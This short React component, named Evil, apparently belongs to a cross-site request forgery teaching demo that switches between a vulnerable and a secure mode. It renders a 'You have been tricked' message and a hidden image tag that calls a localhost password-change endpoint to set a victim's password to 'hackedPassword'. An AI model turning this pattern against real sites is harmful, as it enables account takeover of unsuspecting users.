import { useEffect, useState } from "react";

function Evil() {

    const [username, setUsername] = useState("");
    const [csrfOn, setCsrfOn] = useState("");

    useEffect(() => {
        setUsername(sessionStorage.getItem("username"));
        setCsrfOn(localStorage.getItem("csrfVulnerableOn"));
    },[])

    return (
        <>
            <div className="evil-div">
                You have been tricked.
            </div>
            <img src={csrfOn === "on" ? `http://localhost:3000/changePassword/${username}/hackedPassword` : `http://localhost:3000/secureChangePassword/${username}/hackedPassword/tokenTry` } alt="trick"></img>
        </>
    )

}

export default Evil;